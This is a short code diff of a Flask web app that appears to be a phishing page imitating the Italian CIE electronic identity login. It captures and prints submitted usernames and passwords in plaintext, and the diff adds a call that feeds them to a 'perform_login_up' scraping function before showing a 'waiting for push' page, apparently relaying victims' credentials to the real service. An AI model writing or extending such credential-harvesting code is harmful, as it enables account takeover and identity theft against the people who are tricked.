@@ -1,5 +1,7 @@
-from flask import Flask, Request, redirect, render_template, request, url_for
+from flask import Flask, redirect, render_template, request, url_for
 import random
+from utils.state import State
+from utils.scraping import perform_login_up
 
 app = Flask(__name__)
 
@@ -7,23 +9,6 @@ random.seed()
 
 def todo():
     return "<b>TO BE IMPLEMENTED</b>"
-
-
-class State:
-    username: str = ""
-    password: str = ""
-    wrong_credentials: bool = False
-
-    def __repr__(self):
-        return "Username: {username}, password: {password}. They are {correct}".format(
-                username = self.username,
-                password = self.password,
-                correct = "WRONG" if self.wrong_credentials else "CORRECT"
-        )
-
-    def assign(self, req: Request):
-        self.username = req.form.get("username")
-        self.password = req.form.get("password")
 
 
 state = State()
@@ -62,6 +47,8 @@ def cie_login():
     if challenge == None:
         state.assign(request)
         print(state)
+
+        perform_login_up(state.username, state.password)
 
         page = "cie_waiting_push_{}.html".format("deu" if lang == "deu" else "it")
         return render_template(page)
